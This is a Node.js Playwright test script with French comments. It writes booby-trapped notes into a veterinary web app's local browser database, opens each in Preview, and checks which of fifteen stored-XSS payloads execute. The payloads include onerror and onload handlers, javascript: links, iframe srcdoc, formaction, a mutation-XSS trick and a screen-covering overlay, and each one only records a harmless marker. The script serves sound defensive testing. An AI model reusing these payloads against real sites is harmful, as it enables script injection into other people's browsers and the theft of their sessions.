// Banc de la faille des notes : des notes piégées sont écrites directement dans la base du navigateur (le chemin d'une
// restauration, d'un import ou d'un poste pair : jamais par l'éditeur, dont le schéma filtre), puis chaque note est
// ouverte et passée en Aperçu, qui injecte le HTML stocké. Chaque charge utile note ce qu'elle exécute dans
// window.__pwned ; un lien ou un bouton piégé est cliqué, comme le ferait une personne.
// Usage : node charges.mjs <url du serveur de développement> <fichier de sortie.json> [dossier de captures]
import { mkdirSync, writeFileSync } from "node:fs";
import { chromium } from "/media/psf/Home/.dev-browser/node_modules/playwright-core/index.mjs";

const [base, out, shots] = process.argv.slice(2);
const CHROME = "/home/parallels/.cache/ms-playwright/chromium-1255/chrome-linux-arm64/chrome";
const MARK = (name) => `__pwned.push('${name}')`;

/** name: ce que la charge utile signale ; html: le contenu stocké ; click: un élément à cliquer ensuite. */
export const PAYLOADS = [
  { name: "img-onerror", html: `<p>Texte</p><img src=x onerror="${MARK("img-onerror")}">` },
  { name: "img-majuscules", html: `<IMG SRC=x ONERROR="${MARK("img-majuscules")}">` },
  { name: "svg-onload", html: `<svg onload="${MARK("svg-onload")}"></svg>` },
  { name: "iframe-srcdoc", html: `<iframe srcdoc="<script>parent.${MARK("iframe-srcdoc")}</script>"></iframe>` },
  { name: "lien-javascript", html: `<a id="poc" href="javascript:${MARK("lien-javascript")}">lien</a>`, click: "#poc" },
  { name: "balise-script", html: `<script>${MARK("balise-script")}</script><p>après</p>` },
  { name: "input-autofocus", html: `<input autofocus onfocus="${MARK("input-autofocus")}">` },
  { name: "details-ontoggle", html: `<details open ontoggle="${MARK("details-ontoggle")}"><summary>x</summary></details>` },
  { name: "object-data", html: `<object data="data:text/html,<script>parent.${MARK("object-data")}</script>"></object>` },
  { name: "onclick", html: `<p id="poc" onclick="${MARK("onclick")}">cliquez</p>`, click: "#poc" },
  { name: "formaction", html: `<form><button id="poc" formaction="javascript:${MARK("formaction")}">go</button></form>`, click: "#poc" },
  { name: "mxss-math", html: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=${MARK("mxss-math")}&gt;">` },
  { name: "img-balise-distante", html: `<img src="http://127.0.0.1:1/balise.png">`, remote: true },
  { name: "svg-script", html: `<svg><script>${MARK("svg-script")}</script></svg>` },
  { name: "style-attribut", html: `<p style="position:fixed;inset:0;background:red;z-index:99999" id="poc">couvre l'écran</p>`, style: true },
];

const store = (notes) => JSON.stringify({ tables: {
  users: [{ id: "banc-u1", email: "veto@banc.local", displayName: "Véto Banc", role: "vet_principal", status: "active" }],
  sessions: [{ id: "banc-s1", userId: "banc-u1", token: "banc", expiresAt: "2030-01-01T00:00:00.000Z" }],
  notes,
} });

const browser = await chromium.launch({ executablePath: CHROME, args: ["--no-sandbox"] });
const results = [];
for (const payload of PAYLOADS) {
  const now = "2026-11-26T10:00:00.000Z";
  const note = { id: "n-poc", userId: "banc-u1", title: "Note de test " + payload.name, content: payload.html, isFavorite: false, isPinned: false, patientId: null, tags: "[]", createdAt: now, updatedAt: now };
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, locale: "fr-FR", timezoneId: "Africa/Algiers" });
  await ctx.addInitScript(([s]) => {
    window.__pwned = [];
    localStorage.setItem("vetera.browser-db.v1", s);
    localStorage.setItem("auth_token", "banc");
    localStorage.setItem("baitari:last-seen-version", "5.3.0");
    localStorage.setItem("baitari-guided-tour-v1", JSON.stringify({ dismissed: true }));
  }, [store([note])]);
  const page = await ctx.newPage();
  const dialogs = [], requests = [], popups = [];
  page.on("dialog", (d) => { dialogs.push(d.message()); d.dismiss().catch(() => undefined); });
  page.on("request", (r) => { if (r.url().includes("127.0.0.1:1/")) requests.push(r.url()); });
  ctx.on("page", (p) => { if (p !== page) popups.push(p.url()); });
  await page.goto(base + "/#/notes", { waitUntil: "domcontentloaded" });
  const row = page.getByText(note.title, { exact: false }).first();
  await row.waitFor({ timeout: 30000 });
  await row.click();
  // « Aperçu » est une entrée du menu « Plus d'actions pour cette note » : c'est le geste d'une personne.
  const preview = page.locator(".document-rich-content");
  await page.getByRole("button", { name: /Plus d.actions pour cette note/ }).first().click();
  await page.getByRole("menuitem", { name: /Aperçu/ }).first().click();
  await preview.first().waitFor({ timeout: 15000 });
  await page.waitForTimeout(1500);
  if (payload.click) { await page.locator(".document-rich-content " + payload.click).first().click({ timeout: 3000, force: true }).catch(() => undefined); await page.waitForTimeout(500); }
  const state = await page.evaluate(() => ({
    pwned: window.__pwned,
    preview: document.querySelector(".document-rich-content")?.innerHTML ?? null,
    coversScreen: (() => { const el = document.querySelector(".document-rich-content #poc"); if (!el) return null; const r = el.getBoundingClientRect(); return r.width >= innerWidth * 0.9 && r.height >= innerHeight * 0.9; })(),
    sameOriginFrames: [...document.querySelectorAll(".document-rich-content iframe")].length,
  }));
  results.push({ name: payload.name, executed: state.pwned.length > 0, markers: state.pwned, dialogs, popups, remoteRequests: payload.remote ? requests : undefined, styleCoversScreen: payload.style ? state.coversScreen : undefined, previewHtml: state.preview });
  if (shots) { mkdirSync(shots, { recursive: true }); await page.screenshot({ path: shots + "/" + payload.name + ".png" }); }
  await ctx.close();
}
await browser.close();
// Un effet : du code exécuté, un appel vers un hôte extérieur (suivi, fuite), ou une mise en page qui recouvre l'écran.
const effect = (r) => r.executed || Boolean(r.remoteRequests?.length) || r.styleCoversScreen === true;
const summary = { base, date: new Date().toISOString(), total: results.length, withEffect: results.filter(effect).map((r) => r.name), withoutEffect: results.filter((r) => !effect(r)).map((r) => r.name), results };
writeFileSync(out, JSON.stringify(summary, null, 1));
console.log(JSON.stringify({ total: summary.total, withEffect: summary.withEffect, withoutEffect: summary.withoutEffect }, null, 1));
